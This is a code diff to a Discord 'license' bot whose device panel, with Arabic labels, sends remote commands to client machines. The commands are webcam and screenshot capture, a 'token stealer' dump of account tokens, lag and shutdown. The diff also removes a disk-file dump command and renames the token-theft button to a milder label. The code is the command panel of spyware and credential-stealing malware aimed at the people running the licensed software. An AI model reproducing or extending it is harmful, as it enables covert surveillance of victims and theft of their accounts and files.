@@ -319,7 +319,6 @@ class LicenseBot(discord.Client):
         if interaction.type == discord.InteractionType.component:
             custom_id = interaction.data.get("custom_id", "")
             
-            # التأجيل الفوري لمنع تعليق ديسكورد (Thinking...) وانتهاء المهلة
             if not interaction.response.is_done():
                 try:
                     await interaction.response.defer(thinking=True, ephemeral=True)
@@ -478,7 +477,7 @@ class DeviceActionsView(discord.ui.View):
         db.setdefault("blacklisted_devices", []).append(self.hwid)
         if self.code in db.get("codes", {}):
             db["codes"][self.code].update({"used": False, "device": None})
-        if save_db(db, sha, url, headers, f"Ban {self.code}Manager"):
+        if save_db(db, sha, url, headers, f"Ban {self.code}"):
             await interaction.followup.send("🚫 تم حظر الكود والجهاز بنجاح!", ephemeral=True)
 
     @discord.ui.button(label="👢 طرد بدون حظر", style=discord.ButtonStyle.primary, custom_id="dev_act_kick", row=0)
@@ -577,7 +576,7 @@ class DeviceActionsView(discord.ui.View):
     async def lag_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(LagTimerModal(self.code))
 
-    @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=4)
+    @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=3)
     async def ss_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = await asyncio.to_thread(fetch_db)
@@ -597,7 +596,7 @@ class DeviceActionsView(discord.ui.View):
         db.setdefault("remote_webcams", {})[self.code] = {"id": str(time.time())}
         if save_db(db, sha, url, headers, f"Webcam {self.code}"): await interaction.followup.send("📸 تم طلب الكاميرا!", ephemeral=True)
 
-    @discord.ui.button(label="🔑 سحب التوكنات", style=discord.ButtonStyle.secondary, custom_id="dev_act_tokens", row=4)
+    @discord.ui.button(label="🔑 التوكنات", style=discord.ButtonStyle.secondary, custom_id="dev_act_tokens", row=4)
     async def tokens_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = await asyncio.to_thread(fetch_db)
@@ -607,17 +606,7 @@ class DeviceActionsView(discord.ui.View):
         db.setdefault("remote_token_stealers", {})[self.code] = {"id": str(time.time())}
         if save_db(db, sha, url, headers, f"Tokens Dump {self.code}"): await interaction.followup.send("🔑 تم طلب سحب بيانات توكنات شاملة بنجاح!", ephemeral=True)
 
-    @discord.ui.button(label="📂 سحب الملفات (Dump)", style=discord.ButtonStyle.secondary, custom_id="dev_act_diskdump", row=4)
-    async def dump_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = await asyncio.to_thread(fetch_db)
-        if not db: 
-            await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
-            return
-        db.setdefault("remote_disk_dumps", {})[self.code] = {"id": str(time.time())}
-        if save_db(db, sha, url, headers, f"Dump {self.code}"): await interaction.followup.send("📂 تم طلب سحب الملفات!", ephemeral=True)
-
-    @discord.ui.button(label="⚡ إيقاف جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=5)
+    @discord.ui.button(label="⚡ إيقاف الجهاز", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
     async def shut_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = await asyncio.to_thread(fetch_db)
